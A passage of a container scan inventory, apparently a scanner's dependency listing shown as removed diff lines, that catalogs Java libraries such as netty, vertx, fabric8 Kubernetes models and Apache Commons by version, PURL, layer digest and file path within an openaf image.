-      │                 ├ [57]  ╭ Name      : io.fabric8:kubernetes-model-resource 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-resource@7.6.1 
-      │                 │       │            ╰ UID : a68de97f3676b2cf 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-resource-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [58]  ╭ Name      : io.fabric8:kubernetes-model-scheduling 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-scheduling@7.6.1 
-      │                 │       │            ╰ UID : 51d95e478273d968 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-scheduling-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [59]  ╭ Name      : io.fabric8:kubernetes-model-storageclass 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-storageclass@7.6.1 
-      │                 │       │            ╰ UID : e5f7f68046af1364 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-storageclass-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [60]  ╭ Name      : io.fabric8:zjsonpatch 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/zjsonpatch@7.6.1 
-      │                 │       │            ╰ UID : a63db4e3ccdccb3e 
-      │                 │       ├ Version   : 7.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/zjsonpatch-7.6.1.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [61]  ╭ Name      : io.jsonwebtoken:jjwt-api 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.jsonwebtoken/jjwt-api@0.13.0 
-      │                 │       │            ╰ UID : fe506a80a2899a4a 
-      │                 │       ├ Version   : 0.13.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [62]  ╭ Name      : io.jsonwebtoken:jjwt-gson 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.jsonwebtoken/jjwt-gson@0.13.0 
-      │                 │       │            ╰ UID : cc7c47a353e36bec 
-      │                 │       ├ Version   : 0.13.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [63]  ╭ Name      : io.jsonwebtoken:jjwt-impl 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.jsonwebtoken/jjwt-impl@0.13.0 
-      │                 │       │            ╰ UID : fb75cc968ac3dc0d 
-      │                 │       ├ Version   : 0.13.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [64]  ╭ Name      : io.minio:minio 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.minio/minio@9.0.0 
-      │                 │       │            ╰ UID : c3d88819980fb569 
-      │                 │       ├ Version   : 9.0.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/S3/minio-9.0.0.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [65]  ╭ Name      : io.netty:netty-buffer 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-buffer@4.2.12.Final 
-      │                 │       │            ╰ UID : cc0519ac7d6544d3 
-      │                 │       ├ Version   : 4.2.12.Final 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/netty-buffer-4.2.12.Final.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [66]  ╭ Name      : io.netty:netty-codec-base 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-base@4.2.12.Final 
-      │                 │       │            ╰ UID : c913651beadac915 
-      │                 │       ├ Version   : 4.2.12.Final 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/netty-codec-base-4.2.12.Final.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [67]  ╭ Name      : io.netty:netty-codec-compression 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-compression@4.2.12.Final 
-      │                 │       │            ╰ UID : d5a032dd793fa143 
-      │                 │       ├ Version   : 4.2.12.Final 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/netty-codec-compression-4.2.12.Final.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [68]  ╭ Name      : io.netty:netty-codec-dns 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-dns@4.2.12.Final 
-      │                 │       │            ╰ UID : d1018bca82fa2aba 
-      │                 │       ├ Version   : 4.2.12.Final 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/netty-codec-dns-4.2.12.Final.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [69]  ╭ Name      : io.netty:netty-codec-http 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
-      │                 │       │            ╰ UID : 42139b2b89dda2f4 
-      │                 │       ├ Version   : 4.2.12.Final 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [70]  ╭ Name      : io.netty:netty-codec-http2 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-http2@4.2.12.Final 
-      │                 │       │            ╰ UID : c9374114bd085c75 
-      │                 │       ├ Version   : 4.2.12.Final 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/netty-codec-http2-4.2.12.Final.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [71]  ╭ Name      : io.netty:netty-codec-socks 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-codec-socks@4.2.12.Final 
-      │                 │       │            ╰ UID : 6dac766b028678d7 
-      │                 │       ├ Version   : 4.2.12.Final 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/netty-codec-socks-4.2.12.Final.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [72]  ╭ Name      : io.netty:netty-common 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-common@4.2.12.Final 
-      │                 │       │            ╰ UID : 8d08b61b7945b6a0 
-      │                 │       ├ Version   : 4.2.12.Final 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/netty-common-4.2.12.Final.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [73]  ╭ Name      : io.netty:netty-handler 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-handler@4.2.12.Final 
-      │                 │       │            ╰ UID : 9402666d1399aa5 
-      │                 │       ├ Version   : 4.2.12.Final 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/netty-handler-4.2.12.Final.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [74]  ╭ Name      : io.netty:netty-handler-proxy 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-handler-proxy@4.2.12.Final 
-      │                 │       │            ╰ UID : 8344d1e8c7524c10 
-      │                 │       ├ Version   : 4.2.12.Final 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/netty-handler-proxy-4.2.12.Final.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [75]  ╭ Name      : io.netty:netty-resolver 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-resolver@4.2.12.Final 
-      │                 │       │            ╰ UID : d7528834b57654bb 
-      │                 │       ├ Version   : 4.2.12.Final 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/netty-resolver-4.2.12.Final.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [76]  ╭ Name      : io.netty:netty-resolver-dns 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-resolver-dns@4.2.12.Final 
-      │                 │       │            ╰ UID : 3f10c8fba6a3f35a 
-      │                 │       ├ Version   : 4.2.12.Final 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/netty-resolver-dns-4.2.12.Final.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [77]  ╭ Name      : io.netty:netty-transport 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-transport@4.2.12.Final 
-      │                 │       │            ╰ UID : dc0c50a667b2c4b9 
-      │                 │       ├ Version   : 4.2.12.Final 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/netty-transport-4.2.12.Final.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [78]  ╭ Name      : io.netty:netty-transport-native-unix-common 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.netty/netty-transport-native-unix-common@4.2.
-      │                 │       │            │       12.Final 
-      │                 │       │            ╰ UID : cd2b8af680c1bef9 
-      │                 │       ├ Version   : 4.2.12.Final 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/netty-transport-native-unix-common-4.2.12.Final.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [79]  ╭ Name      : io.sigpipe:jbsdiff 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.sigpipe/jbsdiff@1.0 
-      │                 │       │            ╰ UID : e618a95843fba36b 
-      │                 │       ├ Version   : 1.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [80]  ╭ Name      : io.vertx:vertx-auth-common 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.vertx/vertx-auth-common@4.5.24 
-      │                 │       │            ╰ UID : 4953632041865418 
-      │                 │       ├ Version   : 4.5.24 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/vertx-auth-common-4.5.24.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [81]  ╭ Name      : io.vertx:vertx-core 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.vertx/vertx-core@4.5.24 
-      │                 │       │            ╰ UID : afaef31c626f9650 
-      │                 │       ├ Version   : 4.5.24 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/vertx-core-4.5.24.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [82]  ╭ Name      : io.vertx:vertx-web-client 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.vertx/vertx-web-client@4.5.24 
-      │                 │       │            ╰ UID : df16d1babd29b056 
-      │                 │       ├ Version   : 4.5.24 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/vertx-web-client-4.5.24.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [83]  ╭ Name      : io.vertx:vertx-web-common 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.vertx/vertx-web-common@4.5.24 
-      │                 │       │            ╰ UID : 95ad12caeb922cc7 
-      │                 │       ├ Version   : 4.5.24 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/Kube/vertx-web-common-4.5.24.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [84]  ╭ Name      : jakarta.activation:jakarta.activation-api 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/jakarta.activation/jakarta.activation-api@1.2.2 
-      │                 │       │            ╰ UID : 5d2ee0e1a121653f 
-      │                 │       ├ Version   : 1.2.2 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [85]  ╭ Name      : javax.xml.bind:jaxb-api 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/javax.xml.bind/jaxb-api@2.3.1 
-      │                 │       │            ╰ UID : d465243f613cf5b8 
-      │                 │       ├ Version   : 2.3.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [86]  ╭ Name      : jline:jline 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/jline/jline@2.14.6 
-      │                 │       │            ╰ UID : 509c1c4b5bcd42a1 
-      │                 │       ├ Version   : 2.14.6 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [87]  ╭ Name      : org.apache.commons:commons-collections4 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-collections4@4.5.0 
-      │                 │       │            ╰ UID : 72513cdccf1d063 
-      │                 │       ├ Version   : 4.5.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [88]  ╭ Name      : org.apache.commons:commons-compress 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-compress@1.28.0 
-      │                 │       │            ╰ UID : a82eeb62843349ae 
-      │                 │       ├ Version   : 1.28.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [89]  ╭ Name      : org.apache.commons:commons-csv 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-csv@1.14.1 
-      │                 │       │            ╰ UID : 250a69832ed56f8d 
-      │                 │       ├ Version   : 1.14.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [90]  ╭ Name      : org.apache.commons:commons-email 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-email@1.6.0 
-      │                 │       │            ╰ UID : 973048c510561123 
-      │                 │       ├ Version   : 1.6.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [91]  ╭ Name      : org.apache.commons:commons-lang3 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-lang3@3.20.0 
-      │                 │       │            ╰ UID : 85a4dd2e7bf06fed 
-      │                 │       ├ Version   : 3.20.0 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [92]  ╭ Name      : org.apache.commons:commons-math3 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-math3@3.6.1 
-      │                 │       │            ╰ UID : ce9b8a6c7e85850 
-      │                 │       ├ Version   : 3.6.1 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [93]  ╭ Name      : org.bouncycastle:bcprov-jdk18on 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.bouncycastle/bcprov-jdk18on@1.84 
-      │                 │       │            ╰ UID : aa9cc21dd2336977 
-      │                 │       ├ Version   : 1.84 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/S3/bcprov-jdk18on-1.84.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [94]  ╭ Name      : org.eclipse.jetty.compression:jetty-compression-common 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.compression/jetty-compression-
-      │                 │       │            │       common@12.1.8 
-      │                 │       │            ╰ UID : 33039562bfd52098 
-      │                 │       ├ Version   : 12.1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [95]  ╭ Name      : org.eclipse.jetty.websocket:jetty-websocket-core-client 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.websocket/jetty-websocket-core
-      │                 │       │            │       -client@12.1.8 
-      │                 │       │            ╰ UID : c1075786cc5bdd2e 
-      │                 │       ├ Version   : 12.1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [96]  ╭ Name      : org.eclipse.jetty.websocket:jetty-websocket-core-common 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.websocket/jetty-websocket-core
-      │                 │       │            │       -common@12.1.8 
-      │                 │       │            ╰ UID : 94de3a6f5d13c6e9 
-      │                 │       ├ Version   : 12.1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
-      │                 │       ├ FilePath  : openaf/openaf.jar 
-      │                 │       ╰ AnalyzedBy: jar 
-      │                 ├ [97]  ╭ Name      : org.eclipse.jetty.websocket:jetty-websocket-jetty-api 
-      │                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.websocket/jetty-websocket-jett
-      │                 │       │            │       y-api@12.1.8 
-      │                 │       │            ╰ UID : 73e595faf9ba86ec 
-      │                 │       ├ Version   : 12.1.8 
-      │                 │       ├ Layer      ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94edd
-      │                 │       │            │         8ebe468fc57d07e 
-      │                 │       │            ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0961
-      │                 │       │                      a5292bd158a4dcf 
